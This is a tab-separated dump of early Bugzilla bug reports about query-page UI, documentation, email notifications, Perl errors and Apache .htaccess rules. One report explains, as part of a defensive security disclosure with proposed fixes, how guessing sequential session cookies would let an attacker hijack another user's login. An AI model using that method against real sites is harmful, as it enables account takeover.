110709%TAB%1006113264%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%More useful default checkbox state in new query.cgi%TAB%More useful default checkbox state in new query.cgiTo reproduce: 1.  Look at the state of the checkboxes in the `E-mail and numbering' section     of <http://bugzilla.mozilla.org/attachment.cgi?id=50517&action=view>. 2.  Look at the state of the checkboxes in the `E-mail and numbering' section     of <http://landfill.tequilarista.org/bbaetz/query.cgi>.  What you should see in the second page: *   For the first e-mail selector, `bug owner' is checked by default. *   For the second e-mail selector, all the checkboxes except `commenter' are     checked by default.  What you actually see: *   None of the checkboxes are checked by default.  For those Bugzilla searches which involved e-mail addresses at all, implementing this as specced would -- on average -- save a couple of clicks.
110710%TAB%1006114266%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Bad wording and placement of sort options in new query.cgi%TAB%Bad wording and placement of sort options in new query.cgiTo reproduce: 1.  Go to the bottom of <http://landfill.tequilarista.org/bbaetz/query.cgi>. 2.  Look at the row containing the sort options and search button.  What you should see: *   |                      Sort results by: [ bug number  :^] ( Search ) |  What you actually see: *   | Sort results by: [ Bug Number   :^] ( Submit query )               |  What needs fixing: 1.  The row should be aligned on the right side of the page, not the left, to     be easier to find and closer to the browser's vertical scrollbar (unless     you happen to be using NeXT, in which case I apologize for not putting your     needs ahead of everyone else's). 2.  `Submit query' should be translated into English, i.e. `Search'. :-)
110711%TAB%1006114668%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Checkboxes in new query.cgi should use LABEL,Checkboxes in new query.cgi should use LABEL and other new query.cgi problems%TAB%Checkboxes in new query.cgi should use LABEL,Checkboxes in new query.cgi should use LABEL and other new query.cgi problemsTo reproduce: 1.  Go to <http://bugzilla.mozilla.org/attachment.cgi?id=50517&action=view>. 2.  Click on the word `commenter'. 3.  Note that the checkbox next to `commenter' is toggled. 4.  Go to <http://landfill.tequilarista.org/bbaetz/query.cgi>. 5.  Click on the word `commenter'.  What should happen: *   The checkbox next to `commenter' is toggled.  What actually happens: *   It's not.
110712%TAB%1006115209%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Default should be `contains' for e-mail SELECTs in new query.cgi%TAB%Default should be `contains' for e-mail SELECTs in new query.cgiTo reproduce: 1.  Go to <http://landfill.tequilarista.org/bbaetz/query.cgi>. 2.  Look at the e-mail SELECTS in the `E-mail and numbering' section.  What you should see by default: *   `contains'.  What you see by default: *   `is'.
110751%TAB%1006148887%TAB%14006%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Want attachment title tooltips in links,Want title tooltips in attachment links%TAB%Want attachment title tooltips in links,Want title tooltips in attachment linksWhen writing e.g. attachment 55982 [details] [diff] [review] it would be nice if the link included the tooltip for the attachment's title (in this case, "patch").
110830%TAB%1006171668%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Clarify mysql "user creation" information.%TAB%Clarify mysql "user creation" information.The documentation currently states that a bugs user should be created for Bugzilla, and then proceeds on to do a grant command. This seems to me not very intuitive, even though it's the way it works. Perhaps the text could be changed to clarify the user permissions in mysql?
110936%TAB%1006207910%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,bugzilla.org%TAB%Reviewers' Guide%TAB%Reviewers' GuideWe should include a Bugzilla reviewers' guide with the Bugzilla guide.  Thoughts of what to include:  - Brief description of first-review, second-review statuses and needs-work statuses. - You can mark both first and second review if you think the patch is low risk and doesn't need a separate second review. - You should check the patch fulfils the criteria set out in the Hackers' Guide. - You should test the patch and well as visually inspect it.  There's lots of bugs about adding stuff to the Hackers' Guide, but which haven't been added yet, so before adding stuff here consider whether you should add stuff to the Hackers' Guide rather than the Reviewers' Guide.
110980%TAB%1006241893%TAB%39146%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%no email to CC list when opening new bug%TAB%no email to CC list when opening new bugIn the user preferences in section "When I'm on the CC list, email me"  I check "When I'm added to or removed from this capacity" and I uncheck "New Comments".  If someone else puts me in the CC list when opening a  new bug, I won't get email.  Expected result, however, is that I get email because I have been added to the capacity "being on CC list".  If I get added to CC list lateron, or if I check "New Comments", then emailing works fine.
111522%TAB%1006443319%TAB%16665%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,attachment and request management%TAB%Provide multiple XHTML mime-types for application/xhtml+xml,Provide ability to specify MIME type of attachment when downloading%TAB%Provide multiple XHTML mime-types for application/xhtml+xml,Provide ability to specify MIME type of attachment when downloadingSpun off from bug 111520.  From that bug:  --- quote --- Currently, Bugzilla supports a straight-forward attachment link:  Created an attachment (id=58900)  However, if I as a Bugzilla user could choose multiple mime-types via link for this attactioment, it would be invaluable:  Created an attachment (id=58900, application/xhtml+xml) (application/xml) (text/xml) (text/html)  --- end quote ---  I'm requesting this because a lot of XHTML attachments get filed as text/xml or text/html.  If we can provide an easier way to examine these attachments from multiple mime-types, and encourage using a  mime-type which is for XHTML only, this would make testing of XHTML-based bugs much easier.
111712%TAB%1006574121%TAB%38354%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Changing path to Perl in all Bugzilla files%TAB%Changing path to Perl in all Bugzilla files/docs/html/stepbystep.html#AEN692 gives this to update the path to perl  perl -pi -e 's@#!/usr/bonsaitools/bin/perl@#!/usr/bin/perl@' *cgi *pl Bug.pm  For this to work for me it needed two modifications:  * escape the ! i.e.   perl -pi -e 's@#\!/usr/bonsaitools/bin/perl@#\!/usr/bin/perl@' *cgi *pl Bug.pm  * also need to add processmail and syncshadowdb to the filelist
112373%TAB%1006913429%TAB%36180%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%you should be able to enter bug dependencies/blockers when you enter a bug.%TAB%you should be able to enter bug dependencies/blockers when you enter a bug.Currently when you enter a new bug that should block another bug or that you already know depends on some other bug, you first have to enter the bug. Then go back to it and add the dependencies. It is a multiple step process instead of one. And it creates needless extra bugmail.   You should be able to enter dependencies along with everything else when you first create a bug.
112457%TAB%1006944825%TAB%10200%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs,Documentation%TAB%"comment foo to bug bar" does not link to the correct comment in the correct bug,"bug bar comment foo" syntax for linking directly to a comment should be documented somewhere%TAB%"comment foo to bug bar" does not link to the correct comment in the correct bug,"bug bar comment foo" syntax for linking directly to a comment should be documented somewhereWhen I type "comment 66 to bug 4302" in a comment, I don't get a link to the right comment.  Steps to reproduce: 1. Make a user account on bugzilla.mozilla.org. 2. Find a bug or create a new bug. 3. Add a new comment containing the text "comment 66 to bug 4302" and click    'Commit'.  Actual results: Two links, one to comment 66 of the *current* bug, and one to the beginning of bug 4302.  Expected results: One link to the correct anchor inside bug 4302: http://bugzilla.mozilla.org/show_bug.cgi?id=4302#c66  Possible workaround: Link to the comment using the URL.  Because Bugzilla does not support preview (which could be a bug in itself), you may see several following comments where I try out several possible ways to link to a comment.  I may WFM this bug and open up a Bugzilla:Docs bug if I can trip a regexp that works.
112557%TAB%1006984149%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla Helper,Bugzilla-General%TAB%Should be a more visible note to NOT include full HTML source in bug reports.%TAB%Should be a more visible note to NOT include full HTML source in bug reports.We've all seen them, users who try to be helpful and submit the full HTML for us to view.  However, it really is annoying because everytime we open the bug, we have to PgDown to get past the 1000 line HTML.  Granted, there is no foolproof way to prevent it, but perhaps a more visible note would work.  The current text (in the additional information section) is:  Add any additional information you feel may be relevant to this bug, such as a few lines of HTML that demonstrate the problem, a Talkback crash ID, or special information about your computer's configuration.  I propose that be changed to something like:  Add any additional information you feel may be relevant to this bug, such as a a Talkback crash ID, special information about your computer's configuration, or a <strong>few lines</strong> of HTML that demonstrate the problem.  <span style="color: red">Please do not paste the full HTML source in the comments. If you wish to include the <em>full</em> HTML source, please use the "Create Attachment" link on your bug after it has been posted.</span>
112914%TAB%1007120698%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Test should not `cat $file`%TAB%Test should not `cat $file`002goodperl.t has the line:     my $filecontent = `cat $file`; twice.  This is evil because "cat" isn't a command on win32 (unless you have cygwin in your path).  This should be done using the builtin perl open() command instead (like it is in 005no_tabs.t).  This is currently causing bustage on the Devastator win32 tinderbox at http://tinderbox.mozilla.org/Bugzilla/ (it used to be green when I had cygwin in my path, but that's I think it'd be nice to have the tests run without cygwin).
113088%TAB%1007221441%TAB%37918%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Loading query with "+" in program gives software error,Unencoded regexps passed to make_selection_widget.%TAB%Loading query with "+" in program gives software error,Unencoded regexps passed to make_selection_widget.The bugzilla installation at http://bugzilla.lysator.liu.se/ contains several programs.  Three of them are "fsh", "lyskomd" and "kom++".  If I create a remembered query with the programs "fsh" and "kom++" selected (and nothing else selected), and try to "Load the remembered query", I get a software error.  The first part of the query page looks OK, but where the "Program: Version: Component: Target milestone:" header should be, the following text is inserted:      Content-type: text/html       Software error:      Nested quantifiers before HERE mark in regex m/fsh|kom++ << HERE / at CGI.pl     line 564.  No page footer is displayed.  If the query contains only "kom++", or "fsh" and "lyskomd", the query can be loaded.  That is why I suspect that the "+" sign are the cause of the problem. That suspicion may be wrong.  If I run the query and hit the "Edit this query" button I arrive at the URL entered into the URL field of this report.  That page is broken in the same way as described above.
113383%TAB%1007404645%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%link to dependent bug in "dependent bug changed state" notification%TAB%link to dependent bug in "dependent bug changed state" notification
113438%TAB%1007442368%TAB%40182%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bugzilla.dtd is wrong%TAB%bugzilla.dtd is wrongThe dtd of the bugzilla-distribution is wrong and leads to XML-Parser-Errors  when reading bugs created by xml.cgi. Specifically, long_desc? has to be  replaced by long_desc*, since there may be one or more long_desc's of a bug.
113459%TAB%1007454280%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Bad regexp in emailregexp causes system lockout%TAB%Bad regexp in emailregexp causes system lockoutIf the preferences web interface is used to change emailregexp to   $::param{'emailregexp'} = '^[^@]*@[^@]**$';  Subsequent login attempts result in....  Software error:  /^[^@]*@[^@]**$/: nested *?+ in regexp at CGI.pl line 707.    And it is no longer possible to log in and fix it.     Workaround - edit data/params to fix the erroneous pattern.  Suggested fix - add validation of regexps to forms that permit users to enter  them
113646%TAB%1007546228%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%midair when changing assignee gives error%TAB%midair when changing assignee gives errorThe problem with the code is that the trim() function in globals.pl uses the global variable $_ to store the value being trimmed.  Normally this won't cause problems, but in this situation the Perl interpreter is already using $_ as the value of $::FORM{'knob'} in the switch that starts on line 672 of process_bug.cgi.  I'm not sure exactly why this causes problems, but I suspect that Perl copies the value of $::FORM{'knob'} into $_ by reference rather than by value, so the value of $::FORM{'knob'} gets changed to the trimmed value of $::FORM{'assigned_to'} when the latter variable gets trimmed on line 708.  Using $_ as a temporary variable in trim() seems like a dangerous thing to do in general, so the patch changes trim() to use a local variable instead.
113975%TAB%1007665689%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%cannot only add an email to cc: in Change several bugs at once%TAB%cannot only add an email to cc: in Change several bugs at onceWhen using the "Change several bugs at once" page it is not possible to just add an email to the cc: field. Attempts to do so will give an error page "Um, you apparently did not change anything on the selected bugs."    Steps to reproduce.  1. goto http://bugzilla.mozilla.org/buglist.cgi?email1=jms%40email.de&emailtype1=exact&emaillongdesc1=1&email2=&emailtype2=substring&emailreporter2=1&order=bugs.bug_id&tweak=1 2. click the "check all" button 3. add the email address "jms@email.de" to the cc: list field 4. hit commit.  Results: error page "Um, you apparently did not change anything on the selected bugs."  Expected: the email should be added to the list of bugs.   Additional Info: It may be that the cc: change would have been made if I was also changing some other field (like adding a comment) but I did not test this because I was trying to make a minimal spam change. It should not be necessary to make additional changes.
114179%TAB%1007771598%TAB%7322%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation,User Interface%TAB%Concentration of Bugzilla help system for normal Bugzilla users and general improvements,Concentration, improvement, and templatisation of Bugzilla general user help system%TAB%Concentration of Bugzilla help system for normal Bugzilla users and general improvements,Concentration, improvement, and templatisation of Bugzilla general user help systemThis bug will be assigned to me. I was thinking about bug 88788, and I  thought - why not extend the sections of queryhelp.cgi into a userhelp.cgi  that has different sections based on the parameters passed. Included on this  could be bug_status.html and any other help file that is used as context help  for Mozilla.   Also, I think that every field possible should have a link, such as on  enter_bug.cgi, CC, URL, Summary, Reporter, Version and Description.
114696%TAB%1008067588%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Using SelectVisible() for permission checking not optimal.,Permission checking in queries not optimal across DBs,Permission checking in queries not optimal%TAB%Using SelectVisible() for permission checking not optimal.,Permission checking in queries not optimal across DBs,Permission checking in queries not optimalI have found in practice that buglist.cgi will return results from a large query much  faster when they SelectVisible() wrapper is not used for permission checking. I  feel the performance hit is due to the large amount of outer joins that are being  used. To show the difference you can simple comment out the SelectVisible line in  buglist.cgi and re-run your query. The PostgreSQL branch was basically unusable  without this removal with a large amount of bugs (50,000+). So in the PostgreSQL  branch and now the Groups branch, I have altered to CanSeeBug to both take a  single bug and a list of bugs returning the list of bugs that can be seen by the  current user. This only adds one or two extra SQL queries (one for PostgreSQL,  two for Groups) to each buglist.cgi hit. For details you can check out the code from  either the Bugzilla_PgSql_Branch or the Bugzilla_Groups_Branch. I would be  interested in seeing how this performs with 100,000+ bugs such as  bugzilla.mozilla.org. Also if anyone is better at reading EXPLAIN output it would be  helpful to compare the two.
115650%TAB%1008586546%TAB%30393%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%no title when  posting a bug,No TITLE attribute on buglinks on process_bug.cgi.%TAB%no title when  posting a bug,No TITLE attribute on buglinks on process_bug.cgi.When I make changes to a bug and posting them I've see the bugs this bug depends on. It will be fine to have to each bug-link a title to see whats the bug about.
116819%TAB%1009221074%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Attach and Reassign in one fell swoop%TAB%Attach and Reassign in one fell swoopWas talking to timeless this evening and he suggested that one of the options on the create attachment page should be something along the lines of:  [ ] Reassign this bug to me  as often times when you're attaching a patch, you also want to take ownership of the bug.  I think that this should automatically set the bug's status to ASSIGNED.  And of course, it should only be an option for those with EditBugs (ie, those that could assign it to themselves anyway).
117055%TAB%1009419448%TAB%26173%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Comments after "." on empty line are not emailed%TAB%Comments after "." on empty line are not emailedThe additional comments after a "." on an empty line are not emailed.  Steps to reproduce: 1. Type a line of text in an additional comment. 2. Type a "." (without quotes) on an empty line 3. Type some more comments, but keep the dot on an (otherwise) empty line 4. Commit it  Reproducable: always  It is caused by calling sendmail without the "-i" option,   From man 8 sendmail:        -i     Ignore  dots alone on lines by themselves in incom­               ing messages.  This should be set if you are  read­               ing data from a file.  Not sure what version of Bugzilla Mozilla is using, so setting version to unspecified. I've downloaded 2.14 and that version does not use the "-i" option in the file processmail.
117297%TAB%1009575940%TAB%40250%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Email address added twice in ADD CCs,Email address added twice in ADD CCs due to case-insensitive query%TAB%Email address added twice in ADD CCs,Email address added twice in ADD CCs due to case-insensitive queryMy bugzilla account is my email address with initial-capitalized. when I input my email address in the Add CC field , it is all lower-case. The result is the two addresses (actully one ) are all added in the CCs. And  I get the notifications twice with the two address seperatly.
117614%TAB%1009869364%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Undefined subroutine &main::detaint_natural called at editusers.cgi line 739.%TAB%Undefined subroutine &main::detaint_natural called at editusers.cgi line 739.While using the current 2.14.1 branch, remove or add a user to a group and you receive that message.
117718%TAB%1009952060%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Mass Change removes a bugs groupset,Mass Change removes a bugs groupset if the bug was in the wrong product group%TAB%Mass Change removes a bugs groupset,Mass Change removes a bugs groupset if the bug was in the wrong product groupI was just looking into bug 113975 and notice that $comma always seemed to be  set for me even though I purposfully hadn't seleted anything to change on the  mass form.  That lead me to discover that DoComma() was being called from line  568 which should only be called if either $groupAdd or $groupDel was set.  As  it tuned out, $groupDel was set to be the sum of every group I was in.  I  tested a mass change of a secure bug, making sure that the "Don't change this group restriction" button was selected, and sure enough, it removed the  bug from the group.
117759%TAB%1009965332%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Templatise quips.cgi and roll in new_comment.cgi%TAB%Templatise quips.cgi and roll in new_comment.cgi- Templatisation of quips.cgi - conversion to a single CGI (eliminate new_comment.cgi) - removal of roll-your-own CGI variable parsing - Generally better UI - prepare for later conversion to database-backed quips  and lots of other good stuff.
117936%TAB%1010043038%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Documentation%TAB%.htaccess files for Apache 1.2.x (<Files>, not <FilesMatch>)%TAB%.htaccess files for Apache 1.2.x (<Files>, not <FilesMatch>)Since the <FilesMatch...> directive is only available in Apache 1.3, the .htaccess files generated by checksetup don't work with Apache 1.2.x.  When I use  	<Files ~ "..."> ... </Files>  instead of  	<FilesMatch ^...> ... </FilesMatch> it seems to work for me:  - change FilesMatch -> Files - add the ~ and a space before the regexp - quote the regexp with "..." - finally, drop the ^  Here are the results:  1. .htaccess in the root directory: =============================================================================== # don't allow people to retrieve non-cgi executable files or our private data <Files ~ "(.*\.pl|localconfig|processmail|syncshadowdb|runtests.sh)$">   deny from all </Files> ===============================================================================  2. .htaccess in the data directory (no changes necessary): =============================================================================== # nothing in this directory is retrievable unless overriden by an .htaccess # in a subdirectory deny from all ===============================================================================  3. .htaccess in the data/webdot directory: =============================================================================== # Allow access to nothing in this directory except for .dot files # and don't allow access to those to anyone except research.att.com # if research.att.com ever changed their IP, or if you use a different # webdot server, you'll need to edit this <Files ~ "[0-9]+\.dot$">   Allow from 192.20.225.10   Deny from all </Files>   # And no directory listings, either. Deny from all
118442%TAB%1010284190%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Bugzilla fails to notice if nothing has changed when editing multiple bugs if no keywords have been defined%TAB%Bugzilla fails to notice if nothing has changed when editing multiple bugs if no keywords have been definedIf no keywords have been defined, and a user edits multiple bugs and submits the form without making any changes, Bugzilla is supposed to throw an error about the lack of changes, but instead it tells the user that it submitted the changes.
118774%TAB%1010481686%TAB%34669%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Query template does not display keyword search box%TAB%Query template does not display keyword search boxOn the template "template/default/query/query.atml", the keyword search box is  not displayed unless "have_keywords" is defined to the template engine.  Unfortunately, in version 1.93 of query.cgi that value was defined only if the  following condition is true:  1.93         (gerv%ger 18-Nov-01):  $vars->{'have_keywords'} = scalar(%::legal_keywords);   The legal_keywords is an array not a hash, and so the value fails to be set  properly.
118953%TAB%1010552515%TAB%38277%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Incorrect message from checksetup.pl%TAB%Incorrect message from checksetup.plWhen a module is installed but the version isn't new enough, checksetup.pl  issues the following warning ( I'll just dump the code ).  if (@missing > 0) {     print "\n\n";     print "You are missing some Perl modules which are required by Bugzilla.\n";     print "They can be installed by running (as root) the following:\n";     foreach my $module (@missing) {         print "   perl -MCPAN -e 'install \"$module\"'\n";     }     print "\n";     exit; }  The message is wrong, and should be changed to something like  "Bugzilla requires some Perl modules which are either missing from your system,  or the version on your system is too old."  This is a good idea in general, but is going to cause less headaches when the  patch for Bug 67663 goes in, and people upgrading won't have a new enough  version of CGI::Carp.
119005%TAB%1010567588%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%editgroups.cgi incorrectly states that bug group names cannot contain spaces%TAB%editgroups.cgi incorrectly states that bug group names cannot contain spaceseditgroups.cgi incorrectly states that bug group names cannot contain spaces
119060%TAB%1010584079%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Use of Template.pm filters for url and html encoding.%TAB%Use of Template.pm filters for url and html encoding.Some people are using the built in "uri" and "html" filters provided by  Template.pm for use in their templates and others are importing the url_quote()  and value_quote() functions in and using those instead. If both accomplish the  same thing I feel we should standardize on using the builtin Template.pm filters to  avoid unnecessary pollution of the namespace. We can always pass in new filters  using the FILTERS option if functionality is lacking that we need. What is the  general opinion about this?
119260%TAB%1010658784%TAB%16665%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%JavaScript strict warnings in bugreport.js%TAB%JavaScript strict warnings in bugreport.jsWarning: redeclaration of var i Source File: http://www.mozilla.org/quality/help/bugreport.js Line: 354, Column: 18 Source Code:         for ( var i = 0; i < aForm.OpSys.options.length; i++ ) {  Warning: assignment to undeclared variable buildyear Source File: http://www.mozilla.org/quality/help/bugreport.js Line: 171  Warning: assignment to undeclared variable buildmonth Source File: http://www.mozilla.org/quality/help/bugreport.js Line: 173  Warning: assignment to undeclared variable bug Source File: http://www.mozilla.org/quality/help/bugreport.js Line: 186  Give me a few minutes to come up with a patch.  :)
119517%TAB%1010747660%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%display differences between two patch%TAB%display differences between two patchWhen large patches are updated following a review, it is tedious to pore over the entire patch again if impl. has had to change due to changes in scope, impl or the tree behind the scenes.  An interface to view what was updated in a patch would ease the reviewers load.
119524%TAB%1010748217%TAB%5843%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Accounts%TAB%SECURITY: predictable sessionid (Bugzilla_logincookie),SECURITY: predictable sessionid (Use a token instead of logincookie)%TAB%SECURITY: predictable sessionid (Bugzilla_logincookie),SECURITY: predictable sessionid (Use a token instead of logincookie)We're using bugzilla at work for some internal development projects; thank you for your continued work on this project.  Today I noticed a security problem with the session management/authentication system. Bugzilla requires two cookies: one with the userid, the other with a session number. The session value is sequential, and therefore (relatively) easily guessed. An attacker could theoretically assume someone else's identity by noting their email address (which is in all the tickets they touch) and trying different session numbers til one works. E.G., log in at the beginning of the day, note the session number, wait for the victim to post a change to a ticket, log in again, check the session number, then try connecting with the victim's email address as Bugzilla_login, trying all session numbers between the later number and the earlier number as Bugzilla_logincookie, until one works.  On systems with fewer users (including high-profile projects like OpenSSH [bugzilla.mindrot.org]), the attack would be easier to accomplish.  Suggested improvements:  Option One (easiest to retrofit): shared secret.   Add another configuration variable (populated by a random value when Bugzilla is installed) for a site-wide shared secret. Set another cookie, Bugzilla_token, which is something like the hexadecimal MD5 or SHA hash of "${sessionid}-${secret}-${logintime}". (Might also want to add the User-Agent request header value sent by the browser used at login time. The login time is critical -- without login time, a user could brute-force the secret by looking at their own cookies, making the attack process trivially more complex [the attacker would only have to calculate the hash for each sessionid to be attempted].) The access control code would use Bugzilla_logincookie to find the user's time of login, to calculate the expected Bugzilla_token value. No match == security error message. Disadvantage: someone with read access (no write privileges needed) to the bugzilla server config could obtain the shared secret and use it to attack sessions  Option Two (preferred, requires database change): per-session random tokens  Add a third cookie, Bugzilla_token. Add a column to the session table, tokenhash. When a session is initiated, obtain/generate some random data. Store a seeded MD5  or SHA hash of that data to the session table, and set the cookie to contain the hexadecimal representation of the data itself. The access control code would use Bugzilla_logincookie to find the salt for the stored hash, use the provided Bugzilla_token data to calculate the hash of the client-provided data with that salt, and see if the result matches the stored salted hash. No match == security error message. Advantage: an attacker would have to be able to control/predict the random number generation to hijack a session. Disadvantage: would require modifications to database schema, making this improvment a more difficult upgrade for running sites to use.  Option Two Minus (secure but ugly hack): abusing database definitions  You could probably wedge the per-session salted hash described in Option Two inside some other column in the session table, e.g. in the userid/email column store "${saltedhash}\t${email}" and then parse them as needed. No database changes (== easy upgrades for running sites), but possibly gobs of code changes, and a really awful abuse of the database design.   Recommendation: Option One now, Option Two later  While not as strong as Option Two, Option One should dramatically improve the security of the cookie authentication mechanism, and would be an easy patch/upgrade for current users. Option Two would be preferable in the long term, though. 
119635%TAB%1010797029%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%Templatise duplicates.cgi%TAB%Templatise duplicates.cgiHere it is. I've given it a fair spanking - it now has multiple sortable columns (Myk; you may want to check out how I did this for buglist.cgi - there are some nifty tricks I discovered) and a bevy of changeable options. This also resolves all known bugs in duplicates.cgi.
119657%TAB%1010812422%TAB%9105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Template error checking%TAB%Template error checkingI run into the problem that on the Debian computer I was using there where two packages: - libtemplate-perl - libtemplate-stash-perl  I missed the second one and thus $template->new() failed.  A) Please make use of the error checking for failed ->new() and print Template->error();  (B: Maybe ./checksetup.pl should also check for the stash part of template)
119703%TAB%1010846800%TAB%302291%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General,Attachments & Requests%TAB%Patch Manager - Paste patch,Create an attachment by pasting it into a text field%TAB%Patch Manager - Paste patch,Create an attachment by pasting it into a text fieldIt would be nice if I could just paste a patch into a text field instead of having to create a temp file.  Any chance of doing something like this??
119715%TAB%1010855461%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%strictvaluechecks should always be enabled%TAB%strictvaluechecks should always be enabledISTR a discussion last year mentioning that these were only a param because they hadn't been tested when added. Since bmo runs with these on (and I have one more check we need to add), I think this param is safe to remove.
120004%TAB%1011028291%TAB%7322%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Need info on template and AppConfig in help docs%TAB%Need info on template and AppConfig in help docsIt should also be mentioned that there is an AppConfig in the 5.6Plus  directory of ActiveState so that ppm might find that one instead and return an  error like this:  Error installing package 'AppConfig': Read a PPD for 'AppConfig', but it is not intended for this build of Perl (MSWin32-x86-multi-thread)  Therefore, you need to download both the tarball and ppd directly from  http://openinteract.sourceforge.net/ppmpackages/ to some directory (we'll use  C:\) then run ppm and do: install C:\AppConfig.ppd
120030%TAB%1011041080%TAB%42344%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%RFE: Bugzilla bugs list is Spamma's Paradise,Bugzilla bug lists are a spammer's paradise,Munge email addresses to make life difficult for the spammers' spiders%TAB%RFE: Bugzilla bugs list is Spamma's Paradise,Bugzilla bug lists are a spammer's paradise,Munge email addresses to make life difficult for the spammers' spidersI've just became a Moz Bugzilla user to report a bug, and my e-mail is thus listed on the page of a bug I've just reported. I think that user preferences should definitely have an option to "obscure e-mail" or enter modified e-mail addresses (with, possibly, the real addresses available only to logged-in bugzilla users) so as not to give spam harvesters a nice database of addresses. If not, maybe 1) an option to remove the user account and remove the e-mail address from the bug report (yes, I know it would be quite an annoyance) or 2) including a (bold?) comment on the bug submission form about the user's e-mail being displayed (so they may choose to set up a throwaway account).
120081%TAB%1011072619%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%New min version of Template Toolkit - 2.06%TAB%New min version of Template Toolkit - 2.06This is a spin off (and blocker) of bug 119060 which suggested the use of the uri filter instead of including url_quote as a fileter in the template's object creation.  This filter was added in 2.05b which is a development release.  That means the first stable release that it's in is 2.06.  Simple patch to follow.  Note that this will require action anywhere that 2.15 is currently running (b.m.o, landfill, anybody else that installed the template toolkit when we first rolled over to 2.15 and hasn't updated it since).
120128%TAB%1011088077%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%Offer ability to use Net::LDAP for user authentication%TAB%Offer ability to use Net::LDAP for user authenticationThe patch I'm about to attach was submitted by Elliot Otchet (degroens@yahoo.com).  This patch changes Bugzilla to use Net::LDAP instead of Mozilla::LDAP.  I think the proper course of action for us is to provide a choice, so we'll probably need to modify this patch to use conditionals based on a preference instead of doing just the one.
120236%TAB%1011134561%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Discussion Bug - Bug Triaging%TAB%Discussion Bug - Bug TriagingCurrently I do the triaging.  I periodically look at the untargetted list and resolve them, move them to a milestone or move them to Future.  I do it because no one else volunteered.  Now I suppose I would be content to continue doing the work.  It's useful and I feel it has been useful.  But for one simple fact - I suck at it - I can't balance across milestones to save my life.  Currently there are (I think) around 400 bugs targetted at 2.18, a figure which, from past experience, seems impossible to achieve.  So what can be done to make the milestones more realistic, so we don't keep bumping them up each release?  I'm primarily not really just looking for an "I'll do it", as there's no evidence you'd be any better.  There are just too many things that need doing NOW.  Is there any benefit in transferring this task over to the component owners?  Would they bother?  This is a brainstorming bug, no idea is too ridiculous - it could lead onto a useful idea.
